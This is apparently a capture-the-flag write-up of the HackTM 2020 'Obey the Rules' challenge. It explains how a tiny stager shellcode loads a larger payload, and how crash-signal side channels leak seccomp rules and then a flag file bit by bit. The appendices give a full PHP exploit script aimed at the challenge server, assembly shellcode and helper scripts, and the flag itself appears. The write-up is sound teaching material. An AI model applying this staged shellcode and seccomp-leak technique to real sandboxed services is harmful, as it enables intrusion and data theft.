# Obey the Rules - HackTM 2020 Quals
## Introduction

Obey the Rules is a pwn task.

The goal of this task is to read a file, `/home/pwn/flag.txt`. The binary
provided will execute a user-provided shellcode, but it is protected by seccomp
rules. The rules are not given to challengers.


## 9-bytes Shellcode

The binary prints an ASCII art of a book, and asks to the user whether they obey
or not.

The user's input is read in a 11-bytes buffer. It is then compared against `Y`
with `strcmp`. If it does not, (i.e. if the buffer does not start with `Y\x00`)
the process will execute `/bin/sh`. This will result in the process being killed
due to the seccomp filters.

If the buffer does start with `Y\x00`, the first NULL byte (found with `strlen`)
is replaced with an other `Y`, and the buffer is executed as a shellcode.

When the shellcode is called, `rax` points to the begining of the rwx-mapped
memory area that holds the shellcode. This can be leveraged to overwrite the
shellcode with a longer shellcode using `read`.

```
0000:	59   	pop    rcx     // first Y
0001:	59   	pop    rcx     // NULL, replaced by Y

0002:	31 ff	xor    edi,edi // fd  = 0
0004:	48 96	xchg   rsi,rax // buf = map
0006:	31 c0	xor    eax,eax // syscall = 0 (SYS_read)
0008:	0f 05	syscall
000A:	90	nop
```

## Leaking the seccomp rules

With a longer shellcode, it is possible to issue any syscall. However, almost
every syscalls appear to be blocked by the seccomp rules, including `write`.

It is possible to exfiltrate a bit by terminating the program, either with a
segmentation fault (jumping to invalid memory) or with a trap to debugger
(`int3`, invoking an uncaught `SIGTRAP`)

This oracle can be used to exfiltrate the content of the seccomp rules that
are referenced in a global variable.

The disassembled BPF program used as a filter is the following:
```
l0:	ld [4]
l1:	jeq AUDIT_ARCH_X86_64, l2, l12

l2:	ld [0]
l3:	jge #0x40000000, l12, l4

l4:	jeq SYS_open, l11, l5
l5:	jeq SYS_exit, l11, l6
l6:	jeq SYS_read, l7, l12

l7:	ld [16]
l8:	jeq #0x3, l9, l11

l9:	ld [24]
l10:	jeq #0x602888, l11, l12
l11:	ret #0x7fff0000
l12:	ret #0
```

This filter allows:
1. open
2. exit
3. read when `fd` is not 3
4. read when `fd` is 3, and `buf` is `0x602888`

## Leaking the flag

The seccomp filters only allows the flag to be read at `0x602888` (`fd` == 3).
It is not possible to open a 4th file due to system restrictions set before
creating the process. (à la `ulimit`)

It is possible to run a shellcode that will open the flag, read it at the
correct location and use the script used previously to exfiltrate the flag.

The final shellcode can be found at `shellcode.S` in the appendices. The final
script in `pwn.php` as well as additional scripts that were used to convert
formats (binary digits, BPF, and ascii)

**Flag**: `HackTM{kn0w_th3_rul3s_we11_s0_y0u_c4n_br34k_th3m_EFFECTIVELY}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/home/user/ctf/tools/pwn/phplib/hexdump.php";
require_once "/home/user/ctf/tools/pwn/phplib/tubes/Process.php";
require_once "/home/user/ctf/tools/pwn/phplib/tubes/Socket.php";

const HOST = "138.68.67.161";
const PORT = 20001;

$t = new Socket(HOST, PORT);
$t->expectLine("");
$t->expectLine("           === OBEY THE RULES 1.0 ===");
$t->expectLine("           --------------------------");
$t->expectLine("");
$t->expectLine("    __________________   __________________");
$t->expectLine(".-/|                  \ /                  |\-.");
$t->expectLine("||||    NEW RULES:     |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||                   |                   ||||");
$t->expectLine("||||__________________ | __________________||||");
$t->expectLine("||/===================\|/===================\||");
$t->expectLine("`--------------------~___~-------------------''");
$t->expectLine("");


$t->expectLine("   >> Do you Obey? (yes / no)");

$payload  = "Y\x00"; // pop rcx, pop rcx

$payload .= "\x31\xFF"; // xor edi, edi
$payload .= "\x48\x96"; // xchg rsi, rax
$payload .= "\x31\xC0"; // xor eax, eax (SYS_read)
$payload .= "\x0F\x05"; // syscall
$payload  = str_pad($payload, 0x0B, "\x90");

$shellcode = file_get_contents("shellcode");
$shellcode = str_replace("BBBB", pack("V", $argv[1]), $shellcode);
$payload  .= str_repeat("\x90", strlen($payload));
$payload  .= $shellcode;
$t->write($payload);


$line = $t->readLine();
if($line === "Segmentation fault (core dumped)")
	echo "0";
else if($line === "Trace/breakpoint trap (core dumped)")
	echo "1";
else
	echo "?";
echo "\n";
```

### shellcode.S
```asm
.intel_syntax noprefix
.global _start

_start:
	lea rdi, [rip + filename]
	mov rsi, 0
	mov rax, 0 // SYS_open
	syscall
	// rax == 3

	mov rdi, rax
	mov rsi, 0x602888 // backdoor
	mov rdx, 0x80
	mov rax, SYS_read
	syscall

	// placeholder
	mov ecx, 0x42424242

	// al = target[bit >> 3]
	mov rdi, rcx
	shr rdi, 3
	add rdi, 0x602888
	mov al, byte ptr [rdi]

	and cl, 7
	shr al, cl
	and al, 1

	jnz true
	push 0
	ret

true:
	int3

filename: .asciz "/home/pwn/flag.txt"
```

### convert.php
```php
#!/usr/bin/php
<?php
$byte = 0;
$bit  = 0;

while(true) {
	$r = trim(fgets(STDIN));
	if(feof(STDIN))
		break;

	$byte |= (int)$r << $bit;
	$bit++;

	if(8 === $bit) {
		echo chr($byte);
		$byte = 0;
		$bit  = 0;
	}
}
```

### bpf.php
```php
#!/usr/bin/php
<?php
$opcodes = array();
while(true) {
	$opcode = fread(STDIN, 8);
	if(8 !== strlen($opcode))
		break;
	$opcodes[] = $opcode;
}

printf("%d", sizeof($opcodes));
foreach($opcodes as $op) {
	$a = unpack("v", substr($op, 0, 2))[1];
	$b = unpack("c", substr($op, 2, 1))[1];
	$c = unpack("c", substr($op, 3, 1))[1];
	$d = unpack("V", substr($op, 4, 4))[1];
	printf(",%d %d %d %d", $a, $b, $c, $d);
}
```